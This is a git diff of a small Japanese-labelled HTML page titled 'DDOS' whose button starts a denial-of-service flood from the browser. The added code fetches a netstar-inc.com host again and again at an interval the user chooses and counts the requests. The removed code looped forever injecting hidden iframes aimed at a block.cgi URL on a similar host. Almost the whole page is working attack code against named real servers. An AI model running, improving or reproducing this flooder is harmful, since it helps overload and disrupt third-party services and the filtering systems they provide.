@@ -8,27 +8,23 @@
 </head>
 
 <body>
-  <h1 id="i">攻撃中</h1>
+  <h1 id="i">DDOS</h1>
   <button id="s">開始</button>
   <input type="text" id="in">
-  <h3 id="c"></h3>
+  <h3 id="c">0</h3>
 </body>
 <script>
   document.getElementById('s').onclick = function() {
     document.getElementById('i').innerHTML = '攻撃開始'
-    //setInterval(function() {
-    /* try {
+    setInterval(function() {
+      try {
         fetch('https://gp-uuc4.iss.netstar-inc.com');
-      } catch (e) {}*/
-    //  document.getElementById('c').innerHTML = n;
-    //  n++
-    //}, document.getElementById('in').value)
-    for(;;){
-      setTimeout(_DDoS("isgcblock.iss.netstar-inc.com:8080/block.cgi"),10);
-    }
-    function _DDoS(url){
-      document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"> </iframe>';
-    }
+      } catch (e) {
+        document.getElementById('c').innerHTML = e;
+      }
+      document.getElementById('c').innerHTML = n;
+      n++
+    }, document.getElementById('in').value)
   }
 </script>
 </html>
